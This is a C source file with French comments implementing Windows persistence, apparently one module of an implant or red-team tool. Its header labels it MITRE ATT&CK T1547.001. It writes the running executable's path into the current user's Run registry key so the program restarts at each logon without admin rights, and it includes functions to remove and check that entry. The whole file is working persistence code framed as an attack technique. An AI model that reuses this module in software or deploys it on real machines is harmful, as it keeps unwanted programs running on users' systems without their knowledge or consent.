/*
 * persist.c — Persistance via Registry Run Key (HKCU)
 *
 * Cree une valeur dans HKCU\...\Run pointant vers l'exe courant.
 * Pas de droits admin requis (portee utilisateur courant).
 * La valeur est reecrite a chaque appel -> operation idempotente.
 *
 * MITRE ATT&CK : T1547.001 — Registry Run Keys / Startup Folder
 */

#include <windows.h>

#include <stdio.h>
#include <string.h>

#include "persist.h"

/* Cle Run de l'utilisateur courant */
#define RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

int persist_install(void)
{
    char exe_path[MAX_PATH] = { 0 };
    HKEY  hkey;

    /* Chemin absolu du binaire en cours d'execution */
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    if (exe_path[0] == 0)
        return -1;

    /* Ouvre (ou cree) la cle Run — KEY_SET_VALUE suffit pour ecrire */
    if (RegCreateKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
                        &hkey, NULL) != ERROR_SUCCESS)
        return -1;

    /* Ecrit / reecrit la valeur (idempotent) */
    LONG rc = RegSetValueExA(hkey, PERSIST_VALUE_NAME, 0, REG_SZ,
                             (const BYTE *)exe_path,
                             (DWORD)(strlen(exe_path) + 1));
    RegCloseKey(hkey);

    return (rc == ERROR_SUCCESS) ? 0 : -1;
}

int persist_remove(void)
{
    HKEY hkey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE,
                      &hkey) != ERROR_SUCCESS)
        return 0;   /* cle absente -> rien a faire, pas une erreur */

    LONG rc = RegDeleteValueA(hkey, PERSIST_VALUE_NAME);
    RegCloseKey(hkey);

    return (rc == ERROR_SUCCESS || rc == ERROR_FILE_NOT_FOUND) ? 0 : -1;
}

int persist_is_installed(void)
{
    char     data[MAX_PATH] = { 0 };
    DWORD    size           = sizeof(data);
    HKEY     hkey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_QUERY_VALUE,
                      &hkey) != ERROR_SUCCESS)
        return 0;

    LONG rc = RegQueryValueExA(hkey, PERSIST_VALUE_NAME, NULL, NULL,
                               (BYTE *)data, &size);
    RegCloseKey(hkey);

    return (rc == ERROR_SUCCESS && data[0] != 0) ? 1 : 0;
}
